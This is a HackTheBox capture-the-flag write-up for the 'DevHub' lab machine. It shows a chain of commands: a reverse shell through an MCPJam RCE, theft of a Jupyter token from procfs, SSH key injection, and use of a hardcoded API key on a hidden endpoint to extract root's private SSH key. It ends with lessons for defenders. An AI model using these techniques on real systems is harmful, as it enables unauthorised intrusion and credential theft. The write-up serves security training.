# DevHub - HackTheBox Writeup

## Introduction

**DevHub** is a Linux-based machine focusing on Model Context Protocol (MCP) environments and internal API architectures. Initial access leverages a Remote Code Execution vulnerability (CVE-2026-23744) in the exposed MCPJam application. Lateral movement to the `analyst` user is achieved by extracting a Jupyter Lab authentication token from `procfs` arguments and executing code via a forwarded WebSockets session. Finally, privilege escalation to `root` relies on code review of an internal Python Flask API (OPSMCP) to extract hardcoded credentials and abuse a hidden debugging endpoint to exfiltrate the root SSH private key.

---
## 1. Initial Enumeration
### 1.1 Reconnaissance

#### 1.1.1 Network Scanning

Execution of standard TCP and UDP port scans to map the external attack surface.

**TCP Scan**

```bash
nmap -sVC -p22,80,6278 -Pn -n -T4 -oN TCP.nmap devhub.htb
```

```text
PORT     STATE  SERVICE VERSION
22/tcp   open   ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
80/tcp   open   http    nginx 1.18.0 (Ubuntu)
|_http-title: DevHub - Internal Development Platform
|_http-server-header: nginx/1.18.0 (Ubuntu)
6278/tcp filtered unknown
```

**UDP Scan**

```bash
nmap -sV -sU -T4 --top-ports 200 -oN UDPscan.nmap -Pn 10.129.2.174
```

*(No relevant open UDP ports discovered).*

#### 1.1.2 Web Enumeration

Navigating to `http://devhub.htb` (TCP/80) reveals a static landing page serving as an internal index for the development team. The page leaks internal routing information, pointing to an **MCP Inspector** on port `6274` and an **Analytics Dashboard** on localhost port `8888`.

![devhub_1](https://gianlucabassani.github.io/assets/devhub/devhub_1.png)

Accessing the exposed port `6274` reveals the **MCPJam** application running version `v1.4.2`.

![devhub_2](https://gianlucabassani.github.io/assets/devhub/devhub_2.png)

---

## 2. Initial Access (CVE-2026-23744)

MCPJam v1.4.2 is vulnerable to Remote Code Execution (CVE-2026-23744). The exploit targets the application's backend to execute arbitrary system commands.

### 2.1 Exploit Execution

A reverse shell payload is prepared and caught using a standard netcat listener.

```bash
# Attack Machine (Terminal 1)
nc -nvlp 4444

# Attack Machine (Terminal 2)
python3 exploit.py
```

```text
listening on [any] 4444 ...
connect to [10.10.15.53] from (UNKNOWN) [10.129.2.174] 42868
```

### 2.2 Shell Stabilization

To ensure reliable execution of interactive commands (like SSH or su), the basic reverse shell is upgraded to a fully interactive TTY.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl-Z to background the shell
stty raw -echo; fg
reset
export TERM=xterm
```

**Context Verification:**

```bash
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ id
uid=1001(mcp-dev) gid=1001(mcp-dev) groups=1001(mcp-dev)
```

Initial foothold achieved as user `mcp-dev`.

---
## 3. Internal Enumeration

### 3.1 OS & Kernel Checks

Attempts to execute Kernel LPE exploits (`copyfail` / CVE-2026-31431 and `fragnesia.c` for netfilter UAF) were conducted but failed. The kernel (`5.15.0-179-generic`) is patched against `crypto` vulnerabilities, and network namespace creation (`unshare(CLONE_NEWUSER)`) is restricted by OS hardening policies.

### 3.2 Local Network Services & Processes

Focusing on internal services mapped in the initial web enumeration, socket listeners and their associated processes are analyzed.

```bash
ss -tulpn
```

```text
... [SNIP] ...
tcp   LISTEN 0      128        127.0.0.1:5000      0.0.0.0:*
tcp   LISTEN 0      128        127.0.0.1:8888      0.0.0.0:*
tcp   LISTEN 0      511          0.0.0.0:6274      0.0.0.0:* users:(("node-MainThread",pid=1278,fd=29))
... [SNIP] ...
```

```bash
ps aux | grep -E "1058|1065"
```

```text
... [SNIP] ...
analyst     1058  ... /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab ...
root        1065  ... /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
... [SNIP] ...
```

**Findings:**

1. A Jupyter Lab instance runs locally on TCP/8888 under the `analyst` user. Direct filesystem access to `/home/analyst/` is blocked by DAC permissions (`rwxr-x---`).
2. An internal Flask API (OPSMCP) runs locally on TCP/5000 under the `root` user, executing a script (`server.py`) leveraging the `analyst`'s virtual environment.

---
## 4. Lateral Movement (`mcp-dev` -> `analyst`)

### 4.1 Token Extraction via Procfs

Jupyter Lab is often initiated with its authentication token passed as a command-line argument. The `/proc/<pid>/cmdline` file is world-readable, allowing for information disclosure bypassing directory permissions.

```bash
cat /proc/1058/cmdline | tr '\0' ' ' ; echo
```

```text
/home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 --ServerApp.password= --ServerApp.allow_origin= --ServerApp.disable_check_xsrf=False
```

**Recovered Token:** `a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7`

### 4.2 SSH Port Forwarding

Jupyter requires WebSockets for terminal execution, meaning `curl` is insufficient for RCE. A local port forward must be established. To bypass the lack of the `mcp-dev` password, an SSH key is injected into the current session.

**1. Kali Machine (Key Generation):**

```bash
ssh-keygen -t ed25519 -f ~/.ssh/mcp_key -N ""
cat ~/.ssh/mcp_key.pub
```

**2. Target Machine (Key Injection into `mcp-dev`):**

```bash
mkdir -p ~/.ssh 
echo "<PUB_KEY>" >> ~/.ssh/authorized_keys
chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys
```

**3. Kali Machine (Establish Tunnel):**

```bash
ssh -i ~/.ssh/mcp_key -L 8888:127.0.0.1:8888 mcp-dev@devhub.htb
```

### 4.3 Remote Code Execution via Jupyter

Navigate to `http://127.0.0.1:8888/lab?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7`.

A new notebook is created to execute Python code within the `analyst` context. The payload writes the attacker's SSH public key into `/home/analyst/.ssh/authorized_keys`, securing a stable shell.

```python
import os
pub_key = "ssh-ed25519 AAAAC3... kali@kali"

cmd = f"""
mkdir -p /home/analyst/.ssh
echo '{pub_key}' > /home/analyst/.ssh/authorized_keys
chmod 700 /home/analyst/.ssh
chmod 600 /home/analyst/.ssh/authorized_keys
"""
os.system(cmd)
print("[*] SSH Key Injected successfully.")
```

### 4.4 User Access

Authenticate directly as `analyst` and retrieve the user flag.

```bash
ssh -i ~/.ssh/mcp_key analyst@devhub.htb
cat user.txt
```

```text
b09d8<SNIP>
```

---

## 5. Privilege Escalation (`analyst` -> `root`)

### 5.1 Internal API Code Review (OPSMCP)

With `analyst` privileges, now the source code of the `root` process listening on TCP/5000 is accessible.

```bash
cat /opt/opsmcp/server.py
```

Analysis of the Flask application reveals two critical architectural flaws:

**1. Hardcoded API Key:**
Authentication relies on a static string.

```python
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"
```

**2. Hidden Debug Tool (LFI / Credential Dump):**
The `ops._admin_dump` tool is not listed in the public endpoint but can be invoked via POST request. It allows the direct exfiltration of the `root` SSH private key if specific parameters (`target: ssh_keys`, `confirm: true`) are provided.

```python
elif target == "ssh_keys":
    try:
        with open('/root/.ssh/id_rsa', 'r') as f:
            key_data = f.read()
        return jsonify({
            "target": "ssh_keys",
            "root_private_key": key_data,
            "note": "Emergency recovery key dump"
        })
```

### 5.2 API Abuse & Key Exfiltration

An HTTP POST request is crafted to authenticate and trigger the hidden tool. The JSON response is piped into a Python parser to extract and format the raw RSA private key accurately, bypassing issues with JSON newline serialization.

```bash
curl -s -X POST http://127.0.0.1:5000/tools/call \
     -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
     -H "Content-Type: application/json" \
     -d '{"name": "ops._admin_dump", "arguments": {"target": "ssh_keys", "confirm": true}}' | \
     python3 -c "import sys, json; print(json.load(sys.stdin).get('root_private_key', ''))" > /tmp/root_id_rsa
```

### 5.3 Root Access

Secure the key permissions and SSH into the machine as `root` via the local interface.

```bash
chmod 600 /tmp/root_id_rsa
ssh -i /tmp/root_id_rsa root@127.0.0.1
cat /root/root.txt
```

```text
632d2f<SNIP>
```


## Conclusions

* **Procfs Information Disclosure:** Passing sensitive data like authentication tokens as command-line arguments is inherently insecure on Linux systems, as `/proc/<pid>/cmdline` is readable by any local user and bypasses directory-level discretionary access controls (DAC).
* **Jupyter RCE by Design:** Gaining authenticated access to a Jupyter Lab interface provides native remote code execution in the context of the user running the service, functioning as a legitimate administrative feature that can be heavily abused during lateral movement.
* **Insecure Internal APIs:** The OPSMCP Python application suffered from multiple severe architectural flaws, including hardcoded authentication secrets and the exposure of an emergency credential-dumping endpoint without proper access control or privilege separation.
* **Attack Chain Summary:** Web RCE (CVE-2026-23744) → Procfs Token Leak → SSH Port Forwarding → Jupyter RCE → Hardcoded API Key Extraction → Internal API Abuse → Root SSH Key Exfiltration.

---

## References:

* [CVE-2026-23744 Remote Code Execution POC](https://github.com/suljov/CVE-2026-23744-Remote-Code-Execution-POC)
* [Jupyter Notebook Security - Token Authentication](https://jupyter-server.readthedocs.io/en/latest/operators/security.html)
